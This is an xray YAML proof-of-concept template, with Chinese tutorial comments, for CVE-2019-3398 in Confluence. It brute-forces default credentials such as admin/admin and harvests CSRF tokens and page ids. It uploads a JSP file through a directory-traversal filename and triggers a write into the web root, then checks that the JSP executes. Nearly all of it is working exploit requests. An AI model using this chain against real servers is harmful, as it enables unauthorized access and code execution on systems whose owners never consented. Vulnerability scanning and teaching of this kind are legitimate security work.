# XRAY YAML POC基础的构成
# https://docs.xray.cool/#/guide/yaml/yaml_script_v2
# 漏洞利用大致流程
# https://docs.qq.com/doc/p/2cc11a0d129c2895b28dfd7cf79d2bc8178769a3
# 需要查看的一些比较重要资料
# xray yaml poc 中的相关变量，比如如何解析请求响应的对象
# https://docs.xray.cool/#/guide/yaml/yaml_type_func
# xray yaml poc 作为声明式语言如何在请求之间共享信息
# https://docs.xray.cool/#/guide/yaml/yaml_script_v2?id=output%e4%b8%8esearch%e7%9a%84%e7%bb%84%e5%90%88%e4%bd%bf%e7%94%a8
# 重点：xray yaml poc 和 goby poc 有个区别就是自带requests.session，不用解析响应头返回的JSESSIONID，后续请求会自动带上
name: poc-confluence-CVE-2019-3398
manual: true
transport: http
set: # 生成一些常量用于使用，后续引用需要写成{{常量名}}，相关文章可以参考 https://docs.xray.cool/#/guide/hiq/set
  referer: request.url
  shellEcho: randomLowercase(20)
  shellName: randomLowercase(16)
# 存储账户密码字典的优化办法，使用payloads变量
# https://docs.xray.cool/#/guide/hiq/payloads?id=%e4%bc%98%e5%8c%96%e4%b9%8b%e5%90%8e%ef%bc%8c%e4%bd%bf%e7%94%a8payloads%e8%bf%9b%e8%a1%8c%e7%bc%96%e5%86%99
payloads:
  payloads:
    cred1: # 在 YAML 中，| 符号用于表示一个字面量块。在多行中定义一个字符串，而不需要使用引号或者转义字符。
      # 上述是GPT的描述，实际过程中发现，在payloads需要借助| 符号来定义字符串才能正常工作，如下为例
      u: |
        "admin"
      p: |
        "admin"
    cred2:
      u: | 
        "adminsa"
      p: |
        "adminsa"
    cred3:
      u: | 
        "adminsa1"
      p: |
        "adminsa1"
rules:
  login: # 登录Confluence，主要参数为os_username、os_password，代表账户密码
    request:
      cache: false # 是否使用缓存的请求，如果该选项为 true，那么如果在一次探测中其它脚本对相同目标发送过相同请求，那么便使用之前缓存的响应，而不发新的数据包
      method: POST
      path: /dologin.action
      # 填充好的账户密码，因为yaml为声明式的语言没有逻辑处理语句
      body: os_username={{u}}&os_password={{p}}&os_cookie=true&login=%E7%99%BB%E5%BD%95&os_destination=
      follow_redirects: false
      headers:
        Content-Type: application/x-www-form-urlencoded
      # 判断响应码是否为302且是否存在Location标头
    expression: |
      response.status == 302 && response.headers["Location"] == "/"
  getAtlToken: # 访问主页获取ajs-atl-token，后续文件上传需要用到
    request:
      cache: false
      method: GET
      path: /
      headers:
    # 判断响应码以及登陆后访问的主页是否为Confluence主页
    expression: response.status == 200 && response.title_string == "主页面 - Confluence"
    output:
      # 正则匹配获取ajs-atl-token留作备用，用于后续的新建页面
      search: '"<meta name=\"ajs-atl-token\" content=\"(?<token>\\w*)\">".submatch(response.body_string)'
      altToken: search["token"]
  getSpaceKey: # 访问/rest/api/space 获取空间编号，后续文件上传需要用到
    request:
      cache: false
      method: GET
      path: /rest/api/space
    expression: response.status == 200 && response.headers["Content-Type"].contains("application/json")
    output:
      # 正则匹配首个存在的spaceKey，留作后续备用，用于后续的新建页面
      search: '"\"key\":\"(?<spaceKey>\\w*)\"".submatch(response.body_string)'
      spaceKey: search["spaceKey"]
  createPage: # 基于空间编号在目标空间新建一篇文章，获取ajs-draft-id相当于文章编号，后续文件上传需要用到
    request:
      cache: false
      method: GET
      path: /pages/createpage.action?spaceKey={{spaceKey}}
    expression: response.status == 200
    output:
      search: '"<meta name=\"ajs-draft-id\" content=\"(?<draftid>\\w*)\">".submatch(response.body_string)'
      draftId: search["draftid"]
  uploadShell: # 基于空间编号、文章编号给目标文章上传恶意名称的shell文件，主要参数在下方有说明
    request:
      cache: false
      method: POST
      # filename 保存的文件名，需要带上目录穿越符号以及对应的写入路径，当前用的是 /opt/atlassian/confluence/confluence/ ，linux默认的confluence路径
      # spaceKey 空间编号
      # mimeType 文件编码格式
      # size 重要！！！ 表示文件大小，这个值要和实际文件内容大小相符合，不然会上传失败，也就是说，修改上传内容这个参数的值也需要更新
      # atl_token 此前获取的ajs-atl-token
      # draftId 文章编号
      # name 展示的文件名称
      path: /plugins/drag-and-drop/upload.action?draftId={{draftId}}&filename=../../../../../../opt/atlassian/confluence/confluence/{{shellName}}.jsp&size=30&minorEdit=true&spaceKey={{spaceKey}}&mimeType=application%2Foctet-stream&atl_token={{altToken}}&name={{shellName}}.jsp
      body: |
       <%= "{{shellEcho}}" %>
      headers:
        Content-Type: application/octet-stream
    # 判断响应码以及是否存在ownerId字符串，这个字符串标识所属人员编号
    expression: response.status == 200 && response.body_string.contains("ownerId")
  saveShell: # 保存shell文件，GitHub上的POC没有这一步，不确定是不是版本原因
    request:
      cache: false
      method: POST
      path: /rest/api/content?status=draft
      headers:
        Content-Type: application/json; charset=UTF-8
        Referer: '{{referer}}'
      body: |
        {"status":"current","title":"{{shellEcho}}","space":{"key":"{{spaceKey}}"},"body":{"editor":{"value":"<p>{{shellEcho}}</p>","representation":"editor","content":{"id":"{{draftId}}"}}},"id":"{{draftId}}","type":"page"}
    expression: response.status == 200 && response.body_string.contains("userKey")
    output:
      # 此时保存文章之后获取了一个新的文章编号
      search: '"\"id\":\"(?<id>\\w*)\"".submatch(response.body_string)'
      downloadId: search["id"]
  traversalPath: # 基于上一步新的文章编号进行下载附件，此时会触发目录穿越，主要参数为 pageId
    request:
      cache: false
      method: GET
      follow_redirects: false
      path: /pages/downloadallattachments.action?pageId={{downloadId}}
    expression: response.status == 302
  verifyShell: # 验证穿越到web根目录的shell文件是否存在和解析情况
    request:
      cache: true
      method: GET
      path: /{{shellName}}.jsp
    # 判断文件是否存在以及是否输出此前的随机内容
    expression: response.status == 200 && response.body_string.contains(shellEcho)
# 这个根元素的expression的作用是调用上述函数来形成判断逻辑
# 当前的判断逻辑是上述的8个函数全部为true时即代表漏洞存在
expression: login() && getAtlToken() && getSpaceKey() && createPage() && uploadShell() && saveShell() && traversalPath() && verifyShell()
detail:
  author: Free雅轩
  description: 登录Confluence后利用目录穿越漏洞往服务器web目录中写入shell文件
  warning: 该POC会尝试往Confluence服务器上写入数据
  links:
    - https://xz.aliyun.com/t/4854
    - https://nvd.nist.gov/vuln/detail/CVE-2019-3398